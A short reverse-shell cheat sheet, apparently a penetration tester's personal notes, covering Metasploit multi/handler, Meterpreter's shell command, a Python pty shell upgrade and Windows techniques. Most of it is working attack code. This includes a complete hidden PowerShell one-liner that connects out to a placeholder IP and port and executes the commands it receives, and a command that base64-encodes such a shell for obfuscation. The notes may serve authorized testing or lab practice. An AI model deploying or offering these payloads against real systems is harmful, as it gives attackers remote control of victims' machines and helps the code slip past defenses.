# Gold Rule #
  * Only use open ports to do your rev shell. Firewalls may prevent other ports
  * If a shell is not stable especially php web shells try using metasploit /multi/handler

# Meterpreter #
"shell" command to drop into a system shell after meterpreter makes a connection

# Upgrade Linux Shell with Python #
 * python -c 'import pty; pty.spawn("/bin/bash")'

# Windows #
1. Powershell
  * powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("IP",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
2. Convert your pwoershell rev shell to windows base64
   cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w 0

